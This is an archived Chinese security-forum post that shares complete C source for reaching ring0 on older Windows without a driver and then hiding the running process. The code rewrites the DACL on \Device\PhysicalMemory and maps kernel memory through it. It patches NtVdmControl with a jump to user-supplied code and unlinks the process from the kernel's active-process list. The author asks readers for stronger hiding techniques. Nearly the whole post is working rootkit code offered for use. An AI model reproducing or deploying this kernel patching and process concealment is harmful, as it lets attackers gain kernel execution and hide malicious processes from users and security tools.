
# 无驱动 ring0 下隐藏进程

> 原文：[`www.pediy.com/kssd/pediy10/68729.html`](https://www.pediy.com/kssd/pediy10/68729.html)

标的是原创，其实是把几位高手的代码组合到一块，先用无驱动进入 `ring0`，再在 `ring0` 下修改内核对象隐藏自身进程信息。由于懒惰，里面有好多都是硬编码。望高人指点，特别希望有高人指点一下，最厉害的隐藏进程方法。以下是代码

编译方法：`cl qwer.c`

```c
#include <Windows.h>
#include <winioctl.h>
#include <winsvc.h>
#include <stdlib.h>
#include <stdio.h>
#include <Aclapi.h>
#include <Ntsecapi.h>

#pragma comment (lib,"ntdll.lib")
#pragma comment (lib,"Kernel32.lib")
#pragma comment (lib,"Advapi32.lib")

#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define OBJ_KERNEL_HANDLE           0x00000200
#define STATUS_NOT_IMPLEMENTED       0xC0000002
#define STATUS_ACCESS_DENIED         0xC0000022

//typedef unsigned long DWORD;

#define STATUS_SUCCESS               0X00000000
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

#define InitializeObjectAttributes(p,n,a,r,s){\
       (p)->Length=sizeof(OBJECT_ATTRIBUTES);\
       (p)->RootDirectory=r;\
       (p)->Attributes=a;\
       (p)->ObjectName=n;\
       (p)->SecurityDescriptor=s;\
       (p)->SecurityQualityOfService=NULL;\
       }

NTSYSAPI NTSTATUS NTAPI ZwUnmapViewOfSection(IN HANDLE ProcessHandle,IN PVOID BaseAddress);
NTSYSAPI NTSTATUS NTAPI ZwClose(IN HANDLE Handle);
NTSYSAPI VOID NTAPI RtlInitUnicodeString(PUNICODE_STRING DestinationString,PCWSTR SourceString);
NTSYSAPI NTSTATUS NTAPI NtVdmControl(IN ULONG ControlCode,IN PVOID ControlData);

typedef enum _SECTION_INHERIT
{
    ViewShare=1,
    ViewUnmap=2
}SECTION_INHERIT;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _SYSTEM_MODULE_INFORMATION
{
    ULONG Reserved[2];
    PVOID Base;
    ULONG Size;
    ULONG Flags;
    USHORT Index;
    USHORT Unknown;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    CHAR ImageName[256];
}SYSTEM_MODULE_INFORMATION,*PSYSTEM_MODULE_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenSection(\
    OUT PHANDLE SectionHandle,\
    IN ACCESS_MASK DesiredAccess,\
    IN POBJECT_ATTRIBUTES ObjectAttributes\
    );

  BOOLEAN
(NTAPI *pfnPsGetVersion)(
    PULONG MajorVersion OPTIONAL,
    PULONG MinorVersion OPTIONAL,
    PULONG BuildNumber OPTIONAL,
    PUNICODE_STRING CSDVersion OPTIONAL
    );   

HANDLE
(NTAPI *pfnPsGetCurrentProcessId)(
    );

HANDLE
(NTAPI *pfnPsGetCurrentProcess)();

NTSYSAPI
NTSTATUS
NTAPI
ZwMapViewOfSection(
    IN HANDLE SectionHandle, 
    IN HANDLE ProcessHandle, 
    IN OUT PVOID *BaseAddress, 
    IN ULONG ZeroBits, 
    IN ULONG CommitSize, 
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL, 
    IN OUT PULONG ViewSize, 
    IN SECTION_INHERIT InheritDisposition, 
    IN ULONG AllocationType, 
    IN ULONG Protect
    );

NTSYSAPI
NTSTATUS
NTAPI
ZwQuerySystemInformation(
    ULONG SystemInformationClass, 
    PVOID SystemInformation, 
    ULONG SystemInformationLength, 
    PULONG ReturnLength
    );

PVOID
(NTAPI *pfnMemcpy)(
    IN VOID UNALIGNED *Destination, 
    IN CONST VOID UNALIGNED *Source, 
    IN SIZE_T Length
    );

    NTSTATUS
(NTAPI *pfnNtVdmControl)(
    IN ULONG ControlCode, 
    IN PVOID ControlData
    );

    ULONG
(_cdecl *pfnDbgPrint)(
    IN PCHAR Format, 
    ...
    );

/*typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
*/

NTSTATUS Ring0Code(ULONG size,PULONG buffer)
{
   DWORD eproc=0x00000000;
   ULONG BuildNumber;
   DWORD PIDOffset,ListOffset;
   int start_PID=0; 
   PLIST_ENTRY plist_active_procs;
   PIDOffset=0x84;
   ListOffset=0x88;
 
  //  LIST_ENTRY plist_active_procs;
  // PLIST_ENTRY plist_active_procs;//=NULL;
   
   eproc=(DWORD)pfnPsGetCurrentProcess();
   
   plist_active_procs=(LIST_ENTRY*)(eproc+ListOffset);
   
   *((DWORD*)plist_active_procs->Blink)=(DWORD)plist_active_procs->Flink;
   
   *((DWORD*)plist_active_procs->Flink+1)=(DWORD)plist_active_procs->Blink;
   
   //start_PID=\*((DWORD*)(eproc+PIDOffset));
   //current_PID=start_PID;
 
  // pfnPsGetVersion(NULL,NULL,&BuildNumber,NULL);
   
   //PLIST_ENTRY ListHead,ListPtr;
 
/*  switch (BuildNumber)    // 各版本 OS 的 KPEB 结构不同
    {
        case 2195:  // Win2000
//            ListOffset = 0xa0;
            PIDOffset = 0x9c;
//            NameOffset = 0x1fc;
            break;
        
        case 2600:  // WinXP
  //          ListOffset = 0x88;
            PIDOffset = 0x84;
//            NameOffset = 0x174;
            break;
        
        case 3790:  // Win2003
//            ListOffset = 0x88;
            PIDOffset = 0x84;
//            NameOffset = 0x154;
            break;
        
        default:
            return STATUS_NOT_IMPLEMENTED;
    }*/
   
   pfnDbgPrint("PIDOffset is %d\n",PIDOffset);
   
   //pfnDbgPrint("Enter Ring0\nmyprocess is %d\n",eproc);
   
   //pfnDbgPrint("Enter Ring0\BuildNumber is %d\n",BuildNumber);
 
  // ListOffset=0x88;
   
   return STATUS_SUCCESS;
}

/*
HANDLE OpenPhysicalMemory()
{
   DWORD dwRet;
   NTSTATUS status;
   UNICODE_STRING name;
   OBJECT_ATTRIBUTES oa;
   EXPLICIT_ACCESS ea;
   PSECURITY_DESCRIPTOR pSD;
   PACL pDacl=NULL;
   PACL pNewDacl=NULL;
   HANDLE hSection=NULL;
   HANDLE hSectionRet=NULL;
   
   RtlInitUnicodeString(&name,L"\\Device\\PhysicalMemory");
   
   InitializeObjectAttributes(&oa,&name,OBJ_KERNEL_HANDLE,NULL,NULL);
   
   status=ZwOpenSection(&hSectionRet,SECTION_MAP_READ|SECTION_MAP_WRITE,&oa);
   
   if(NT_SUCCESS(status))
   {
        printf("错误\n");
        return NULL;
   }
   
   dwRet=0;
   
   return NULL;
}*/

PVOID MapPhysicalMemory(HANDLE hSection, // 物理内存的 Section 句柄
                       ULONG Offset,     // 映射起始偏移量，相对于物理内存的 0 地址
                       ULONG CommitSize // 映射范围
                       )
{
    NTSTATUS status;
    PVOID BaseAddress = NULL;
    LARGE_INTEGER PhysicalAddress = {Offset, 0};
    SIZE_T ViewSize = CommitSize;
    
    status = ZwMapViewOfSection(hSection, (HANDLE)-1, &BaseAddress, 0, 
        CommitSize, &PhysicalAddress, &ViewSize, ViewShare, 0, PAGE_READWRITE);
    
    if (!NT_SUCCESS(status))
    {
        printf("ZwMapViewOfSection Failed: %d\n", LsaNtStatusToWinError(status));
        return NULL;
    }
    
    return BaseAddress;
}

HANDLE OpenPhysicalMemory()
{
    DWORD dwRet;
    NTSTATUS status;
    UNICODE_STRING name;
    OBJECT_ATTRIBUTES oa;
    EXPLICIT_ACCESS ea;
    PSECURITY_DESCRIPTOR pSD;
    PACL pDacl = NULL;
    PACL pNewDacl = NULL;
    HANDLE hSection = NULL;
    HANDLE hSectionRet = NULL;
    
    RtlInitUnicodeString(&name, L"\\Device\\PhysicalMemory");
    
    InitializeObjectAttributes(&oa, &name, OBJ_KERNEL_HANDLE, NULL, NULL);
    
    // 以可读写 Section 权限打开 PhysicalMemory
    status = ZwOpenSection(&hSectionRet, SECTION_MAP_READ | SECTION_MAP_WRITE, &oa);
    
    if (NT_SUCCESS(status)) goto FreeAndExit; // 打开成功，直接返回
    
    if (status != STATUS_ACCESS_DENIED)
    {
        // 错误，但非权限不足，打开失败
        printf("ZwOpenSection[0] Failed: %d\n", LsaNtStatusToWinError(status));
        hSectionRet = NULL;
        goto FreeAndExit;
    }
    
    // 以可读写 ACL 权限打开 PhysicalMemory
```



```c
    status = ZwOpenSection(&hSection, READ_CONTROL | WRITE_DAC, &oa);

    if (!NT_SUCCESS(status))
    {
        printf("ZwOpenSection[1] Failed: %d\n", LsaNtStatusToWinError(status));
        goto FreeAndExit;
    }

    // 获取 PhysicalMemory 的 DACL
    dwRet = GetSecurityInfo(hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
        NULL, NULL, &pDacl, NULL, &pSD);

    if (dwRet != ERROR_SUCCESS)
    {
        printf("GetSecurityInfo Failed: %d\n", dwRet);
        goto FreeAndExit;
    }

    // 创建一个 ACE，允许当前用户读写 PhysicalMemory
    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));

    ea.grfAccessPermissions = SECTION_MAP_READ | SECTION_MAP_WRITE;
    ea.grfAccessMode = GRANT_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
    ea.Trustee.ptstrName = "CURRENT_USER";
    // 将新的 ACE 加入 DACL
    dwRet = SetEntriesInAcl(1, &ea, pDacl, &pNewDacl);

    if (dwRet != ERROR_SUCCESS)
    {
        printf("SetEntriesInAcl Failed: %d\n", dwRet);
        goto FreeAndExit;
    }

    // 更新 PhysicalMemory 的 DACL
    dwRet = SetSecurityInfo(hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
        NULL, NULL, pNewDacl, NULL);

    if (dwRet != ERROR_SUCCESS)
    {
        printf("SetSecurityInfo Failed: %d\n", dwRet);
        goto FreeAndExit;
    }

    // 再次以可读写权限打开 PhysicalMemory
    status = ZwOpenSection(&hSectionRet, SECTION_MAP_READ | SECTION_MAP_WRITE, &oa);

    if (!NT_SUCCESS(status))
    {
        printf("ZwOpenSection[2] Failed: %d\n", LsaNtStatusToWinError(status));
        goto FreeAndExit;
    }

FreeAndExit:
    if (pSD) LocalFree(pSD);
    if (pNewDacl) LocalFree(pNewDacl);
    if (hSection) ZwClose(hSection);

    return hSectionRet;
}

int main()
{
   char OrigCode[12],HookCode[12]="\xE9\xDD\xDD\xDD\xDD\xB8\x01\x00\x00\xC0\xC3";
   NTSTATUS status;
   PVOID buffer=NULL;
   char Kernel[100],*mapping=NULL;
   HMODULE hKernel=NULL;
   HANDLE hSection=NULL;
   PVOID pBuffer,pModule,pKernel;
   PSYSTEM_MODULE_INFORMATION pmi;
   ULONG offset;
   int n,i;
   ULONG nRetSize;

   pBuffer=LocalAlloc(LPTR,0x1000);

   if(pBuffer==NULL)
   {
      printf("LocalAlloc failed\n");
      return 0;
   }

   status=ZwQuerySystemInformation(11,pBuffer,0x1000,&nRetSize);

   if (STATUS_INFO_LENGTH_MISMATCH == status)
    {
        LocalFree(pBuffer);
        pBuffer = LocalAlloc(LPTR, nRetSize);
        if (NULL == pBuffer)
        {
            printf("LocalAlloc[1] Failed: %d\n", GetLastError());
            return 0;
        }
        status = ZwQuerySystemInformation(11, pBuffer, nRetSize, &nRetSize);
    }

   pmi=(PSYSTEM_MODULE_INFORMATION)((ULONG)pBuffer+4);
   n=*(ULONG*)pBuffer;
   pModule=NULL;
   printf("n=%d\n");
   printf("Base= %0x\n",pmi->Base);
   pKernel=pmi->Base;

   if((ULONG)pmi->Base<0x80000000||(ULONG)pmi->Base>0x9fffffff)
   {
       printf("模块基址超出直接内存映射范围\n");
       return 0;
   }

//  for(i=0;i<n;i++)
   {
 //    printf("%s\n",pmi->ImageName+pmi->ModuleNameOffset);
 //     pmi++;
   }

   //strcpy(Kernel,(PCSTR)(pmi->ImageName+pmi->ModuleNameOffset));
   hKernel=LoadLibrary((PCSTR)(pmi->ImageName+pmi->ModuleNameOffset));

 //   hKernel=LoadLibrary("ntkrnlpa.exe");

   if(NULL==hKernel)
   {
       printf("LoadLibrary Failed\n");
       return 0;
   }

   //hSection=OpenPhysicalMemory();

   if((pfnMemcpy=(PVOID)GetProcAddress(hKernel,"memcpy"))&&(pfnNtVdmControl=(PVOID)GetProcAddress(hKernel,"NtVdmControl"))&&(pfnDbgPrint=(PVOID)GetProcAddress(hKernel,"DbgPrint"))&&(pfnPsGetCurrentProcessId=(PVOID)GetProcAddress(hKernel,"PsGetCurrentProcessId"))&&(pfnPsGetVersion=(PVOID)GetProcAddress(hKernel,"PsGetVersion"))&&(pfnPsGetCurrentProcess=(PVOID)GetProcAddress(hKernel,"PsGetCurrentProcess")));
   else
   {
        printf("GetProcAddress failed\n");
        return 0;
   }

   offset=(ULONG)pKernel-(ULONG)hKernel;

   (ULONG)pfnMemcpy+=offset;
   (ULONG)pfnNtVdmControl+=offset;
   (ULONG)pfnDbgPrint+=offset;

   *(ULONG*)(HookCode+1)=(ULONG)Ring0Code-(ULONG)pfnNtVdmControl-5;

   hSection=OpenPhysicalMemory();

   if(hSection==NULL)
   {
       printf("set section failed\n");
       goto FreeAndExit;
   }

   offset=(ULONG)pfnNtVdmControl & 0x1FFFF000;

   mapping=MapPhysicalMemory(hSection,offset,0x2000);

   if(mapping==NULL)
   {
      printf("mapping failed\n");
      goto FreeAndExit;
   }

   offset=(ULONG)pfnNtVdmControl & 0x00000FFF;

   memcpy(OrigCode,mapping+offset,12);

   buffer=LocalAlloc(LPTR,0x4000);

   if(buffer==NULL)
   {
      printf("buffer failed\n");
      goto FreeAndExit;
   }

   memcpy(mapping+offset,HookCode,12);

   status=NtVdmControl(0x4000,buffer);

   memcpy(mapping+offset,OrigCode,12);

   if(!NT_SUCCESS(status))
   {
       printf("NtVdmControl failed\n");
      goto FreeAndExit;
   }

//   printf("pKernel=%0x hKernel=%0x offset=%0x pfnMemcpy=%0x pfnNtVdmControl=%0x\n",pKernel,hKernel,offset,pfnMemcpy,pfnNtVdmControl);

FreeAndExit:
   if(buffer!=NULL)LocalFree(buffer);
   if(mapping!=NULL) ZwUnmapViewOfSection(hSection,mapping);
   if(hSection!=NULL) ZwClose(hSection);
   if(hKernel!=NULL)   FreeLibrary(hKernel);

   while(1);
   return 0;
}
```

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) | | `qwer.rar` |
| :--- | :--- | :--- |
